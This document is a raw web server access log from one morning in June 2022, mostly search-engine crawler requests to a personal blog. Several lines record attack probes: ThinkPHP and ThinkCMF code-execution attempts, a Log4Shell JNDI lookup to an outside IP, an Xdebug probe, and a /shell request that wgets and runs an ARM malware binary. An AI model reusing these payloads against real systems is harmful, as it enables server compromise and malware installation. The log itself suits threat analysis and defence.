49.36.189.86 - - [27/Jun/2022:09:13:41 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 404 186 "https://www.sitepoint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45"
51.222.253.16 - - [27/Jun/2022:09:15:52 +0000] "GET /node/category/smf/ HTTP/2.0" 200 8440 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.43 - - [27/Jun/2022:09:16:02 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.12 - - [27/Jun/2022:09:16:05 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [27/Jun/2022:09:16:06 +0000] "GET /node/939/img_6399 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.14 - - [27/Jun/2022:09:16:08 +0000] "GET /node/939/img_6399/ HTTP/1.1" 200 7886 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [27/Jun/2022:09:16:25 +0000] "GET /wp-content/uploads/2014/01/IMG_6480.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.18 - - [27/Jun/2022:09:18:17 +0000] "GET /node/category/l10n/ HTTP/2.0" 200 9337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.7 - - [27/Jun/2022:09:19:14 +0000] "GET /node/353 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.40 - - [27/Jun/2022:09:19:17 +0000] "GET /node/353/ HTTP/1.1" 200 7953 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.12 - - [27/Jun/2022:09:19:36 +0000] "GET /node/category/nvidia/ HTTP/2.0" 200 12578 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.5 - - [27/Jun/2022:09:19:44 +0000] "GET /node/9 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [27/Jun/2022:09:19:46 +0000] "GET /node/9/ HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
80.87.201.163 - - [27/Jun/2022:09:20:42 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
51.222.253.11 - - [27/Jun/2022:09:21:04 +0000] "GET /node/date/2012/09/ HTTP/2.0" 200 10694 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:09:22:31 +0000] "GET /node/date/2005/03/ HTTP/2.0" 200 10929 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:09:23:52 +0000] "GET /node/category/mediawiki/ HTTP/2.0" 200 8847 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:09:24:32 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.222.253.8 - - [27/Jun/2022:09:25:47 +0000] "GET /node/category/thai/ HTTP/2.0" 200 8290 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
157.55.39.23 - - [27/Jun/2022:09:29:37 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.149 - - [27/Jun/2022:09:29:44 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
178.79.169.18 - - [27/Jun/2022:09:30:15 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
192.241.221.241 - - [27/Jun/2022:09:39:10 +0000] "GET /hudson HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
66.249.66.24 - - [27/Jun/2022:09:51:13 +0000] "GET /node/121/ HTTP/1.1" 200 11077 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.222.253.16 - - [27/Jun/2022:09:53:01 +0000] "GET /node/category/tiger/ HTTP/2.0" 200 8937 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:09:54:01 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:09:54:01 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.8 - - [27/Jun/2022:09:55:25 +0000] "GET /img_6588/ HTTP/2.0" 200 7909 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.106 - - [27/Jun/2022:09:56:23 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.174 - - [27/Jun/2022:09:56:32 +0000] "GET /node/183 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.17 - - [27/Jun/2022:09:57:29 +0000] "GET /node/date/2016/05/ HTTP/2.0" 200 10343 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [27/Jun/2022:09:59:21 +0000] "GET /node/category/libthai/ HTTP/2.0" 200 10052 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:09:59:47 +0000] "GET /node/865/ch7_3219 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:00:09 +0000] "GET /node/143 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.5 - - [27/Jun/2022:10:01:02 +0000] "GET /img_6890 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.40 - - [27/Jun/2022:10:01:04 +0000] "GET /img_6890/ HTTP/1.1" 200 7871 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [27/Jun/2022:10:01:20 +0000] "GET /node/581/img_1727/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.13 - - [27/Jun/2022:10:01:21 +0000] "GET /img_6581/ HTTP/2.0" 200 7872 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.2 - - [27/Jun/2022:10:01:27 +0000] "GET /wp-content/uploads/2014/01/IMG_6581.jpg HTTP/2.0" 200 679089 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:10:01:31 +0000] "GET /wp-content/uploads/2014/01/IMG_6579-150x150.jpg HTTP/2.0" 200 23197 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:10:01:33 +0000] "GET /wp-content/uploads/2014/01/IMG_6583-150x150.jpg HTTP/2.0" 200 26236 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:10:02:59 +0000] "GET /node/date/2009/11/ HTTP/2.0" 200 16441 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:10:05:01 +0000] "GET /node/category/music/ HTTP/2.0" 200 12070 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:10:07:10 +0000] "GET /ch7_3997/ HTTP/2.0" 200 7866 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:10:08:59 +0000] "GET /node/category/plugins/ HTTP/2.0" 200 11659 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:10:09:02 +0000] "GET /show/google_from_nectec_crop.png HTTP/2.0" 200 48894 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.44 - - [27/Jun/2022:10:10:08 +0000] "GET /node/date/2004/12/ HTTP/1.1" 200 10262 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.20 - - [27/Jun/2022:10:10:51 +0000] "GET /img_6583/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.71.180 - - [27/Jun/2022:10:11:26 +0000] "GET /node/509 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.31 - - [27/Jun/2022:10:11:27 +0000] "GET /node/509 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.28 - - [27/Jun/2022:10:11:27 +0000] "GET /node/509/ HTTP/1.1" 200 9790 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.229 - - [27/Jun/2022:10:11:42 +0000] "GET /wp-content/uploads/2014/01/IMG_7257.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
118.184.177.74 - - [27/Jun/2022:10:12:01 +0000] "GET / HTTP/1.1" 200 396 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
51.222.253.6 - - [27/Jun/2022:10:12:40 +0000] "GET /node/category/iiimf/ HTTP/2.0" 200 9897 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:10:14:32 +0000] "GET /node/date/2009/06/ HTTP/2.0" 200 11389 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:10:16:18 +0000] "GET /node/category/uncategorized/page/8/ HTTP/2.0" 200 9984 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.12 - - [27/Jun/2022:10:18:10 +0000] "GET /node/1731/img_7749/ HTTP/2.0" 200 7893 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.4 - - [27/Jun/2022:10:18:13 +0000] "GET /wp-content/uploads/2014/02/IMG_7751-150x150.png HTTP/2.0" 200 7462 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:10:18:14 +0000] "GET /wp-content/uploads/2014/02/IMG_7749.png HTTP/2.0" 200 107702 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.6 - - [27/Jun/2022:10:18:16 +0000] "GET /wp-content/uploads/2014/02/Screenshot-2014-02-18-14.51.58-150x150.png HTTP/2.0" 200 15753 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:10:19:47 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.222.253.16 - - [27/Jun/2022:10:19:54 +0000] "GET /node/category/music/page/8/ HTTP/2.0" 200 11165 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.16 - - [27/Jun/2022:10:21:41 +0000] "GET /node/1101/ch7_3334/ HTTP/2.0" 200 7886 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:10:21:45 +0000] "GET /wp-content/uploads/2014/01/CH7_3334.jpg HTTP/2.0" 200 2147931 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:10:21:46 +0000] "GET /node/332 HTTP/2.0" 301 178 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:10:21:47 +0000] "GET /wp-content/uploads/2014/01/CH7_3350_01-150x150.jpg HTTP/2.0" 200 71859 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:10:21:49 +0000] "GET /wp-content/uploads/2014/01/CH7_3296-150x150.jpg HTTP/2.0" 200 88041 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:10:23:20 +0000] "GET /img_6584/ HTTP/2.0" 200 7872 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.6 - - [27/Jun/2022:10:25:12 +0000] "GET /img_7688/ HTTP/2.0" 200 7882 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [27/Jun/2022:10:25:15 +0000] "GET /wp-content/uploads/2014/02/IMG_7689-150x150.jpg HTTP/2.0" 200 11307 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:10:25:17 +0000] "GET /wp-content/uploads/2014/02/IMG_7688.jpg HTTP/2.0" 200 1556571 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:10:27:04 +0000] "GET /ch7_3991/ HTTP/2.0" 200 7867 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:10:27:47 +0000] "GET /robots.txt HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:10:27:48 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 302 154 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:10:29:01 +0000] "GET /node/category/nlc/ HTTP/2.0" 200 8040 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:10:30:57 +0000] "GET /node/category/ubuntu/edgy/ HTTP/2.0" 200 9438 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
5.56.58.29 - - [27/Jun/2022:10:31:13 +0000] "GET /radio.txt HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
2a03:2880:25ff:2::face:b00c - - [27/Jun/2022:10:31:51 +0000] "GET / HTTP/1.1" 200 294 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
51.222.253.9 - - [27/Jun/2022:10:33:36 +0000] "GET /node/1120/img_6646/ HTTP/2.0" 200 7880 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.6 - - [27/Jun/2022:10:33:38 +0000] "GET /wp-content/uploads/2014/01/IMG_6623-150x150.jpg HTTP/2.0" 200 25370 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:10:33:42 +0000] "GET /wp-content/uploads/2014/01/IMG_6646.jpg HTTP/2.0" 200 2255075 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:10:33:45 +0000] "GET /wp-content/uploads/2014/01/IMG_6647-150x150.jpg HTTP/2.0" 200 27012 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:10:35:33 +0000] "GET /node/category/d-i/ HTTP/2.0" 200 8495 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.46 - - [27/Jun/2022:10:36:30 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.7 - - [27/Jun/2022:10:37:17 +0000] "GET /node/243 HTTP/2.0" 301 178 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.174 - - [27/Jun/2022:10:37:46 +0000] "GET / HTTP/2.0" 200 15995 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.43 - - [27/Jun/2022:10:38:44 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.45 - - [27/Jun/2022:10:38:46 +0000] "GET /node/865/ch7_3141 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.5 - - [27/Jun/2022:10:38:48 +0000] "GET /node/865/ch7_3141/ HTTP/1.1" 200 7889 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.14 - - [27/Jun/2022:10:39:32 +0000] "GET /node/date/2005/07/page/4/ HTTP/2.0" 200 11523 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.71.31 - - [27/Jun/2022:10:41:26 +0000] "GET /node/509/ HTTP/1.1" 200 9790 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.222.253.7 - - [27/Jun/2022:10:41:26 +0000] "GET /node/date/2006/04/ HTTP/2.0" 200 9589 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.9 - - [27/Jun/2022:10:42:03 +0000] "GET /node/374 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.5 - - [27/Jun/2022:10:42:06 +0000] "GET /node/374/ HTTP/1.1" 200 8986 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
17.121.113.46 - - [27/Jun/2022:10:42:49 +0000] "GET /wp-content/uploads/2013/12/Screenshot-2013-12-08-23.34.38.png HTTP/1.1" 200 129919 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
51.222.253.17 - - [27/Jun/2022:10:43:21 +0000] "GET /node/939/img_6451/ HTTP/2.0" 200 7848 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:10:45:13 +0000] "GET /node/category/x11/ HTTP/2.0" 200 8873 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:10:46:27 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:46:27 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.16 - - [27/Jun/2022:10:46:55 +0000] "GET /node/date/2005/06/10/ HTTP/2.0" 200 8118 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:10:48:52 +0000] "GET /node/date/2007/05/09/ HTTP/2.0" 200 9255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.15 - - [27/Jun/2022:10:50:55 +0000] "GET /img_7730/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:10:52:33 +0000] "GET /node/581/img_1730 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:52:39 +0000] "GET /node/865/ch7_3181 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:52:43 +0000] "GET /node/939/img_6376 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.7 - - [27/Jun/2022:10:52:47 +0000] "GET /node/category/m500/ HTTP/2.0" 200 8293 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:10:54:47 +0000] "GET /node/category/pidgin/ HTTP/2.0" 200 11192 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:10:56:44 +0000] "GET /feed/?attachment_id=1182 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:56:47 +0000] "GET /feed/?attachment_id=1392 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:10:56:50 +0000] "GET /feed/?attachment_id=1584 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.14 - - [27/Jun/2022:10:57:08 +0000] "GET /node/date/2014/02/11/ HTTP/2.0" 200 9650 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.9.150.140 - - [27/Jun/2022:10:57:34 +0000] "GET /apiv4?{jndi:ldap://45.92.54.232/github/graphql} HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.191.171.25 - - [27/Jun/2022:10:58:58 +0000] "GET /img_6508 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.38 - - [27/Jun/2022:10:59:00 +0000] "GET /img_6508/ HTTP/1.1" 200 7920 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.5 - - [27/Jun/2022:10:59:30 +0000] "GET /img_7676/ HTTP/2.0" 200 7874 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:11:01:24 +0000] "GET /node/category/toshiba/satellite/ HTTP/2.0" 200 10078 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.73 - - [27/Jun/2022:11:02:20 +0000] "GET /node/693/5 HTTP/1.1" 302 154 "https://mrchoke.org/node/tag/centos?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [27/Jun/2022:11:02:23 +0000] "GET /node/693/5 HTTP/1.1" 301 178 "https://mrchoke.org/node/tag/centos?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [27/Jun/2022:11:02:30 +0000] "GET /node/693/5/ HTTP/1.1" 200 10566 "https://mrchoke.org/node/tag/centos?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.18 - - [27/Jun/2022:11:03:21 +0000] "GET /img_7185/ HTTP/2.0" 200 7902 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.18 - - [27/Jun/2022:11:03:29 +0000] "GET /node/72 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [27/Jun/2022:11:03:31 +0000] "GET /node/72/ HTTP/1.1" 200 8915 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.7.214.104 - - [27/Jun/2022:11:03:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
216.244.66.229 - - [27/Jun/2022:11:05:04 +0000] "GET /wp-content/uploads/2014/01/IMG_6141-e1388843261176.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.5 - - [27/Jun/2022:11:05:32 +0000] "GET /ch7_3996/ HTTP/2.0" 200 7867 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:11:07:27 +0000] "GET /node/category/sniff/ HTTP/2.0" 200 7934 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.164.20.136 - - [27/Jun/2022:11:09:11 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 193.233.48.38/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4 HTTP/1.1" 404 162 "-" "Hello, world"
51.222.253.7 - - [27/Jun/2022:11:09:27 +0000] "GET /node/date/2005/12/ HTTP/2.0" 200 7936 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.15 - - [27/Jun/2022:11:09:30 +0000] "GET /rte/emoticons/smile_sarcastic.gif HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
